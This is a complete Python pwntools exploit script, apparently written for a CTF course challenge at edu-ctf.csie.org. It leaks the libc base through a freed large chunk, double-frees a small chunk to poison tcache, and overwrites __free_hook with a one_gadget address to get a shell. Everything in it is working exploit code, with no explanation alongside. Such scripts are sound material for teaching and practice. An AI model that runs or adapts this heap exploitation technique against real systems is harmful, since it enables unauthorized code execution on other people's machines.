from pwn import *

context.arch = "amd64"
y = remote('edu-ctf.csie.org', 10179)
l = ELF('./libc.so')

def add(size, note):
	y.sendafter('>', '1')
	y.sendafter('Size: ', str(size))
	y.sendafter('Note: ', note)

def show(index):
	y.sendafter('>', '2')
	y.sendafter('Index: ', str(index))


def delete(index):
	y.sendafter('>', '3')
	y.sendafter('Index: ', str(index))

add(0x410, 'leak')
add(0x20, 'a')


delete(0)
show(0)
y.recvline()
l.address = u64(y.recv(6)+'\0\0') - 0x3ebca0
success('libc -> %s' % hex(l.address))



delete(1)
delete(1)

add(0x20, p64(l.sym.__free_hook))
add(0x20, 'a')
add(0x20, 'aaa' + p64(l.address + 0x4f322))



# add(0x68, 'aaa' + p64(l.sym.system))
# y.sendafter('>', '1')
# y.sendafter('Size: ', str(l.search('/bin/sh').next()))


y.interactive()